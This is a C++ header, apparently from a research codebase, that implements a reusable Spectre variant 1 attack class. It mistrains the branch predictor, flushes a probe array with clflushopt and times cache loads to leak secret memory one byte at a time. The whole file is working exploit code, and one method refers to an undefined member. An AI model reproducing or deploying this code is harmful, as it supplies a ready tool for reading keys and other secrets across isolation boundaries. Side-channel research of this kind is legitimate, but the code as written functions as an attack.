//
// Created by sage on 1/13/21.
//

#ifndef CACHECASH_SPECTREV1_H
#define CACHECASH_SPECTREV1_H

#include <cacheutils.h>

// void fn_vuln(size_t) is defined:
//      let k := *(p_base + x)
//      then p_scratchpad + k*block_len is brought into the cache
// Therefore, if we call fn_vuln(2), then we should see p_scratchpad + 2*block_len in the cache

// See tests/test_specv1.cpp for example use

// block_len must be at least the cache line size; a small block_len means poor accuracy
//      increasing n_max_tries and n_trainings can improve accuracy but will make each byte read slower

template< class FnVuln, class FnTrain >
class SpectreFunc {
public:
    SpectreFunc(FnVuln fn_vuln, FnTrain fn_train)
        : m_fn_vuln( std::move(fn_vuln) ),
        m_fn_train( std::move(fn_train) )
    {}
    ~SpectreFunc() = default;

    template< typename... Args >
    void operator()(Args &&... args)
    {
        m_fn_vuln(std::forward<Args>(args)...);
    }

    auto get_legal_args(size_t i)
    {
        return m_fn_train(i);
    }

    template< typename... Args >
    uint32_t timed(Args &&... args)
    {
        uint32_t t1, t2;
        asm volatile("rdtscp":"=a"(t1) : :"rcx", "rdx");
        m_func(std::forward<Args>(args)...);
        asm volatile("rdtscp":"=a"(t2) : :"rcx", "rdx");
        return t2 - t1;
    }

private:
    FnVuln m_fn_vuln;
    FnTrain m_fn_train;
};

template <typename FnVuln, typename FnTrain>
class Spectrev1 {
public:

    inline Spectrev1(
            void * const p_base,                         // base address from which we read secret
            void * const p_scratchpad,                   // probe array (must be writeable)
            FnVuln &&fn_vuln,                                 // calls the speculative function
            FnTrain &&fn_get_trainx,                        // given a size_t, returns a legal argument for fn_vuln
            size_t block_len,                               // num bytes b/w monitored lines of p_scratchpad
            size_t n_max_tries,                             // max num attempts to read secret
            int n_trainings)                                // num times to send good arg to fn_vuln before sending bad arg
        : p_base(reinterpret_cast<uint8_t * const>(p_base)),
          p_scratchpad(reinterpret_cast<uint8_t * const>(p_scratchpad)),
          fn_spectre(SpectreFunc(fn_vuln, fn_get_trainx)),
          block_len(block_len),
          n_max_tries(n_max_tries),
          n_trainings(n_trainings),
          cachelinesize(get_cachelinesize())
    {
        get_thresh(false);
    }

    Spectrev1(Spectrev1 const &) = delete;
    Spectrev1 & operator=(Spectrev1 const &) = delete;
    ~Spectrev1() = default;

    // Read n_bytes from p_secret and write it to p_buf
    // Require: At least n_bytes allocated from p_buf
    volatile void read( void volatile * p_secret, size_t n_bytes, uint8_t *p_buf);

    // Read a byte from p_secret into p_val
    volatile void read_byte( void volatile * p_secret, uint8_t *p_val);

private:
    void do_attack(size_t train_x, size_t mal_x);
    void mistrain(size_t train_x, size_t mal_x);
    void find_hits(size_t train_x);
    uint8_t volatile * const p_base;
    uint8_t volatile * const p_scratchpad;
    SpectreFunc<FnVuln, FnTrain> fn_spectre;
    const size_t block_len;
    const size_t n_max_tries;
    const int n_trainings;

    // Index of the two blocks (p_scratchpad + high*block_len) with the highest number of hits
    int16_t high;
    int16_t high2;

    const size_t cachelinesize;

    int results[MAX_BYTE];      // track hits in p_base
};

template <class FnVuln, class FnTrain>
inline volatile void Spectrev1<FnVuln, FnTrain>::read( void volatile * const p_secret, size_t n_bytes, uint8_t *p_buf)
{
    for(auto i = 0; i < n_bytes; ++i)
    {
        read_byte(CVMEM_ADD(p_secret,i), &p_buf[i]);
    }
}
template <class FnVuln, class FnTrain>
inline volatile void Spectrev1<FnVuln, FnTrain>::read_byte( void volatile * const p_secret, uint8_t *p_val)
{
    memset(results, 0 , sizeof(results));
    high = high2 = -1;

    volatile size_t mal_x = (reinterpret_cast<uint8_t volatile * const>(p_secret) - p_base);

    for (auto tries = n_max_tries; tries > 0; --tries)
    {
        do_attack(fn_spectre.get_legal_args(tries), mal_x);

        if ( (results[high] == 2 && results[high2] == 0) || (results[high] >= (2*results[high2] + n_trainings)) )
        {
            break;
        }
    }
    D("[*] %02x (%d) | %02x (%d)\n", high, results[high], high2, results[high2]);
    *p_val = high;
}

template <class FnVuln, class FnTrain>
inline void Spectrev1<FnVuln, FnTrain>::do_attack(size_t train_x, size_t mal_x)
{
    // Fast Flush every cache line in p_scratchpad
    for (volatile auto i = 0; i < MAX_BYTE*block_len; i += cachelinesize)
    {
        asm volatile("clflushopt (%0);" :: "R"(&p_scratchpad[i]));
    }

    mistrain(train_x, mal_x);
    find_hits(train_x);
}
template <class FnVuln, class FnTrain>
inline void Spectrev1<FnVuln, FnTrain>::mistrain(size_t train_x, size_t mal_x)
{
    volatile uint64_t x;
    for (int i = (n_trainings*(n_trainings+1))-1; i >= 0; --i)
    {
        // Set x to mal_x when i % (n_trainings+1) == 0
        x = (i % (n_trainings+1));
        x = (x-1)/(x+1);
        x = train_x ^ (x & (mal_x ^ train_x));

        fn_spectre(x);
    }
}

template <class FnVuln, class FnTrain>
inline void Spectrev1<FnVuln, FnTrain>::find_hits(size_t train_x)
{
    int mix_i, i;
    for (i = 0; i < MAX_BYTE; ++i)
    {
        mix_i = MIX(i);
        if ( mix_i != p_base[train_x] && is_hit(load(&p_scratchpad[mix_i*block_len])) )
        {
            ++results[mix_i];
            // Find the two highest scores
            if (mix_i == high)
            {
                continue;
            }
            else if (high < 0 || results[mix_i] >= results[high])
            {
                high2 = high;
                high = mix_i;
            }
            else if (high2 < 0 || results[mix_i] >= results[high2])
            {
                high2 = mix_i;
            }
        }
    }

}


#endif //CACHECASH_SPECTREV1_H
